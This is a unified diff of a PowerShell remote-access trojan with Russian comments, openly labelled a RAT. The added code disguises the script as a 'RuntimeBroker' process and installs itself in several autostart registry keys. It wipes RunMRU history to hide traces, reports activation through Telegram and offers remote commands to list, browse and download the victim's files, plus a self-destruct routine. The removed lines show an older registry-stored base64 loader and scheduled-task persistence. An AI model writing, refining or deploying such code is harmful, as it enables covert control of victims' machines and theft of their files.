@@ -111,73 +111,56 @@ function Compress-Folder {
     }
 }
 
-# Уникальное место для сохранения - реестр как хранилище скрипта
-function Install-RAT {
-    # Очистка истории RUN при установке
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
-    
-    # Сохраняем скрипт в реестре (уникальный метод)
-    $regStoragePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
-    if (!(Test-Path $regStoragePath)) { 
-        New-Item -Path $regStoragePath -Force | Out-Null 
-    }
-    
-    $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -Encoding UTF8
-    $encodedContent = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($scriptContent))
-    
-    # Разбиваем на части из-за ограничения длины значений в реестре
-    $chunkSize = 8000
-    for ($i = 0; $i -lt $encodedContent.Length; $i += $chunkSize) {
-        $chunk = $encodedContent.Substring($i, [Math]::Min($chunkSize, $encodedContent.Length - $i))
-        Set-ItemProperty -Path $regStoragePath -Name "Hidden$i" -Value $chunk -Force -ErrorAction SilentlyContinue
-    }
-    
-    # Создаем загрузчик из реестра
-    $loaderPath = "$env:APPDATA\Microsoft\Network\wlanext.exe"
-    $loaderContent = @"
-`$parts = @(); `$i = 0; while (`$true) { `$part = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name "Hidden`$i" -ErrorAction SilentlyContinue)."Hidden`$i"; if (`$part) { `$parts += `$part; `$i++ } else { break } }; `$script = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((`$parts -join ''))); Invoke-Expression `$script
-"@
-    
-    $loaderContent | Out-File -FilePath $loaderPath -Encoding UTF8 -Force
-    
-    # Устанавливаем в автозагрузку через несколько методов для надежности
-    $regPaths = @(
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
-    )
-    
-    foreach $regPath in $regPaths {
+# Уникальная установка - маскировка под системный процесс
+$uniqueName = "RuntimeBroker_" + (Get-Random -Minimum 1000 -Maximum 9999)
+$scriptPath = "$env:APPDATA\Microsoft\Windows\NetworkCache\$uniqueName.ps1"
+$batPath = "$env:APPDATA\Microsoft\Windows\NetworkCache\$uniqueName.bat"
+
+# Создание BAT файла для запуска PowerShell скрипта
+$batContent = "@echo off`npowershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+$batContent | Out-File -FilePath $batPath -Encoding ASCII
+
+# Копирование скрипта
+$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
+$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
+
+# Установка в несколько мест автозагрузки
+$regPaths = @(
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
+    "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
+)
+
+foreach ($regPath in $regPaths) {
+    try {
         if (!(Test-Path $regPath)) { 
             New-Item -Path $regPath -Force | Out-Null 
         }
-        Set-ItemProperty -Path $regPath -Name "WindowsNetwork" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$loaderPath`"" -Force -ErrorAction SilentlyContinue
-    }
-    
-    # Дополнительный метод через планировщик задач
-    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$loaderPath`""
-    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
-    Register-ScheduledTask -TaskName "WindowsNetworkService" -Action $taskAction -Trigger $taskTrigger -Description "Windows Network Service" -Force -ErrorAction SilentlyContinue | Out-Null
-    
-    return $true
+        if ($regPath -like "*Windows NT*") {
+            Set-ItemProperty -Path $regPath -Name "Load" -Value $batPath -Force -ErrorAction SilentlyContinue
+        } else {
+            Set-ItemProperty -Path $regPath -Name $uniqueName -Value $batPath -Force -ErrorAction SilentlyContinue
+        }
+    } catch { }
 }
+
+# Очистка истории RUN после установки
+try {
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+} catch { }
 
 # Основные переменные
 $currentDir = "C:\"
 $global:LastSentMessage = ""
 
-# Установка RAT
-$installationResult = Install-RAT
-if ($installationResult) {
-    Send-Telegram "RAT успешно установлен на $env:COMPUTERNAME
+# Отправка информации о запуске
+Send-Telegram "RAT активирован на $env:COMPUTERNAME
 Доступные команды:
 /help - список команд
 /ls - список файлов
 /cd [папка] - сменить директорию
 /download [файл] - скачать файл
 /selfdestruct - самоуничтожение"
-} else {
-    Send-Telegram "Ошибка установки RAT"
-}
 
 # Основной цикл опроса
 while ($true) {
@@ -264,80 +247,74 @@ $($fileList -join "`n")"
                             $success = $true
                             $report = "Отчет самоуничтожения:`n"
                             
-                            # 1. Очистка истории RUN
+                            # 1. Удаление из автозагрузки
+                            foreach ($regPath in $regPaths) {
+                                try {
+                                    if ($regPath -like "*Windows NT*") {
+                                        Remove-ItemProperty -Path $regPath -Name "Load" -Force -ErrorAction SilentlyContinue
+                                    } else {
+                                        Remove-ItemProperty -Path $regPath -Name $uniqueName -Force -ErrorAction SilentlyContinue
+                                    }
+                                    $report += "✓ Реестр $regPath очищен`n"
+                                } catch {
+                                    $success = $false
+                                    $report += "✗ Ошибка очистки реестра $regPath`n"
+                                }
+                            }
+                            
+                            # 2. Очистка истории RUN
                             try {
-                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction Stop
+                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                 $report += "✓ История RUN очищена`n"
                             } catch {
+                                $success = $false
                                 $report += "✗ Ошибка очистки истории RUN`n"
-                                $success = $false
                             }
                             
-                            # 2. Удаление из автозагрузки
-                            $regPaths = @(
-                                "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
-                                "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
-                            )
+                            # 3. Удаление файлов с задержкой и повторными попытками
+                            $filesToDelete = @($scriptPath, $batPath, $MyInvocation.MyCommand.Path)
                             
-                            foreach $regPath in $regPaths {
-                                try {
-                                    Remove-ItemProperty -Path $regPath -Name "WindowsNetwork" -Force -ErrorAction SilentlyContinue
-                                } catch { }
-                            }
-                            $report += "✓ Автозагрузка удалена`n"
-                            
-                            # 3. Удаление планировщика задач
-                            try {
-                                Unregister-ScheduledTask -TaskName "WindowsNetworkService" -Confirm:$false -ErrorAction SilentlyContinue
-                                $report += "✓ Планировщик задач очищен`n"
-                            } catch {
-                                $report += "✗ Ошибка удаления из планировщика`n"
-                                $success = $false
-                            }
-                            
-                            # 4. Удаление загрузчика
-                            $loaderPath = "$env:APPDATA\Microsoft\Network\wlanext.exe"
-                            try {
-                                if (Test-Path $loaderPath) { 
-                                    Remove-Item $loaderPath -Force -ErrorAction Stop
-                                    $report += "✓ Загрузчик удален`n"
-                                }
-                            } catch {
-                                $report += "✗ Ошибка удаления загрузчика`n"
-                                $success = $false
-                            }
-                            
-                            # 5. Очистка реестра от частей скрипта
-                            $regStoragePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
-                            try {
-                                $i = 0
-                                while ($true) {
-                                    $propName = "Hidden$i"
-                                    $prop = Get-ItemProperty -Path $regStoragePath -Name $propName -ErrorAction SilentlyContinue
-                                    if ($prop) {
-                                        Remove-ItemProperty -Path $regStoragePath -Name $propName -Force -ErrorAction SilentlyContinue
-                                        $i++
-                                    } else {
-                                        break
+                            foreach ($file in $filesToDelete) {
+                                if (Test-Path $file) {
+                                    for ($i = 0; $i -lt 3; $i++) {
+                                        try {
+                                            Remove-Item $file -Force -ErrorAction Stop
+                                            if (!(Test-Path $file)) {
+                                                $report += "✓ Файл $file удален`n"
+                                                break
+                                            }
+                                        } catch {
+                                            if ($i -eq 2) {
+                                                $success = $false
+                                                $report += "✗ Не удалось удалить $file`n"
+                                            }
+                                            Start-Sleep -Milliseconds 500
+                                        }
                                     }
                                 }
-                                $report += "✓ Данные из реестра удалены`n"
-                            } catch {
-                                $report += "✗ Ошибка очистки реестра`n"
-                                $success = $false
                             }
                             
-                            # 6. Удаление текущего файла скрипта через отдельный процесс
+                            # 4. Создание задачи для окончательной очистки при перезагрузке
                             try {
-                                $currentScript = $MyInvocation.MyCommand.Path
-                                if (Test-Path $currentScript) {
-                                    $cmd = "cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q `"$currentScript`""
-                                    Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c", $cmd
-                                    $report += "✓ Файл скрипта помечен на удаление`n"
-                                }
+                                $cleanupScript = @"
+try {
+    `$files = @('$scriptPath', '$batPath', '$($MyInvocation.MyCommand.Path)')
+    foreach (`$file in `$files) {
+        if (Test-Path `$file) { Remove-Item `$file -Force -ErrorAction SilentlyContinue }
+    }
+    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force -ErrorAction SilentlyContinue
+} catch { }
+"@
+                                $cleanupPath = "$env:TEMP\cleanup.ps1"
+                                $cleanupScript | Out-File -FilePath $cleanupPath -Encoding UTF8
+                                schtasks /create /tn "SystemCleanup" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`"" /sc once /st 23:59 /f 2>&1 | Out-Null
+                                schtasks /run /tn "SystemCleanup" 2>&1 | Out-Null
+                                Start-Sleep 2
+                                schtasks /delete /tn "SystemCleanup" /f 2>&1 | Out-Null
+                                if (Test-Path $cleanupPath) { Remove-Item $cleanupPath -Force }
+                                $report += "✓ Задача очистки создана`n"
                             } catch {
-                                $report += "✗ Ошибка удаления файла скрипта`n"
-                                $success = $false
+                                $report += "✗ Ошибка создания задачи очистки`n"
                             }
                             
                             if ($success) {
@@ -347,6 +324,8 @@ $($fileList -join "`n")"
                             }
                             
                             Send-Telegram $report
+                            
+                            # Завершение работы
                             exit
                         }
                     }
